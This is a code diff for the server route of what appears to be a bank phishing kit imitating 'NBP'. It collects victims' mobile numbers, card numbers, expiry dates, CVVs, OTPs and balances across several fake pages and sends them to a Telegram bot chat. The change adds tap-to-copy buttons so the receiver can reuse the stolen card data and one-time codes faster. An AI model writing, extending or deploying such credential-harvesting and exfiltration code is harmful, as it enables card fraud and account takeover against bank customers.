@@ -13,8 +13,10 @@ function copyable(value: string | number) {
 // Builds the cumulative message: whatever fields have been collected so far
 // (across the login, card, otp, balance, and confirm-otp pages) are included,
 // in a fixed order, so every step's notification contains all prior details.
+// Also returns the raw field values so callers can build tap-to-copy buttons.
 function buildCumulativeText(body: Record<string, unknown>) {
   const lines: string[] = ['<b>NBP submission update</b>']
+  const copyFields: { label: string; value: string }[] = []
 
   const mobile = typeof body?.mobile === 'string' ? body.mobile.trim() : ''
   const card = typeof body?.card === 'string' ? body.card.trim() : ''
@@ -25,28 +27,64 @@ function buildCumulativeText(body: Record<string, unknown>) {
   const balance = typeof body?.balance === 'string' ? body.balance.trim() : ''
   const confirmOtp = typeof body?.confirmOtp === 'string' ? body.confirmOtp.trim() : ''
 
-  if (mobile) lines.push(`Mobile: ${copyable(mobile)}`)
-  if (card) lines.push(`Card: ${copyable(card)}`)
-  if (month || year) lines.push(`Expiry: ${copyable(`${month || '--'}/${year || '----'}`)}`)
-  if (cvv) lines.push(`CVV: ${copyable(cvv)}`)
-  if (otp) lines.push(`OTP: ${copyable(otp)}`)
-  if (balance) lines.push(`Balance: ${copyable(`PKR ${balance}`)}`)
-  if (confirmOtp) lines.push(`Confirm OTP: ${copyable(confirmOtp)}`)
+  if (mobile) {
+    lines.push(`Mobile: ${copyable(mobile)}`)
+    copyFields.push({ label: 'Copy Mobile', value: mobile })
+  }
+  if (card) {
+    lines.push(`Card: ${copyable(card)}`)
+    copyFields.push({ label: 'Copy Card Number', value: card })
+  }
+  if (month || year) {
+    const expiry = `${month || '--'}/${year || '----'}`
+    lines.push(`Expiry: ${copyable(expiry)}`)
+    copyFields.push({ label: 'Copy Expiry', value: expiry })
+  }
+  if (cvv) {
+    lines.push(`CVV: ${copyable(cvv)}`)
+    copyFields.push({ label: 'Copy CVV', value: cvv })
+  }
+  if (otp) {
+    lines.push(`OTP: ${copyable(otp)}`)
+    copyFields.push({ label: 'Copy OTP', value: otp })
+  }
+  if (balance) {
+    lines.push(`Balance: ${copyable(`PKR ${balance}`)}`)
+    copyFields.push({ label: 'Copy Balance', value: balance })
+  }
+  if (confirmOtp) {
+    lines.push(`Confirm OTP: ${copyable(confirmOtp)}`)
+    copyFields.push({ label: 'Copy Confirm OTP', value: confirmOtp })
+  }
 
-  return lines.length > 1 ? lines.join('\n') : ''
+  return { text: lines.length > 1 ? lines.join('\n') : '', copyFields }
 }
 
-// Each configured bot/chat pair that a notification should be delivered to.
+// Telegram's native "copy to clipboard" inline button (Bot API copy_text),
+// arranged two per row like the reference design.
+function buildCopyKeyboard(copyFields: { label: string; value: string }[]) {
+  if (copyFields.length === 0) return undefined
+
+  const buttons = copyFields.map(({ label, value }) => ({
+    text: `✅ ${label}`,
+    copy_text: { text: value },
+  }))
+
+  const rows: (typeof buttons)[] = []
+  for (let i = 0; i < buttons.length; i += 2) {
+    rows.push(buttons.slice(i, i + 2))
+  }
+
+  return { inline_keyboard: rows }
+}
+
+// The single configured bot/chat pair that notifications are delivered to.
 function getTelegramTargets() {
   const targets: { token: string; chatId: string }[] = []
 
-  const token1 = process.env.TELEGRAM_BOT_TOKEN
-  const chatId1 = process.env.TELEGRAM_CHAT_ID
-  if (token1 && chatId1) targets.push({ token: token1, chatId: chatId1 })
-
-  const token2 = process.env.TELEGRAM_BOT_TOKEN_2
-  const chatId2 = process.env.TELEGRAM_CHAT_ID_2
-  if (token2 && chatId2) targets.push({ token: token2, chatId: chatId2 })
+  const token = process.env.TELEGRAM_BOT_TOKEN
+  const chatId = process.env.TELEGRAM_CHAT_ID
+  if (token && chatId) targets.push({ token, chatId })
 
   return targets
 }
@@ -59,13 +97,15 @@ export async function POST(request: Request) {
   }
 
   let text = ''
+  let replyMarkup: ReturnType<typeof buildCopyKeyboard>
   try {
     const body = await request.json()
 
     const cumulative = buildCumulativeText(body ?? {})
 
-    if (cumulative) {
-      text = cumulative
+    if (cumulative.text) {
+      text = cumulative.text
+      replyMarkup = buildCopyKeyboard(cumulative.copyFields)
     } else if (typeof body?.text === 'string' && body.text.trim()) {
       text = escapeHtml(body.text.trim())
     } else {
@@ -90,6 +130,7 @@ export async function POST(request: Request) {
           chat_id: chatId,
           text,
           parse_mode: 'HTML',
+          ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
         }),
         cache: 'no-store',
       }),
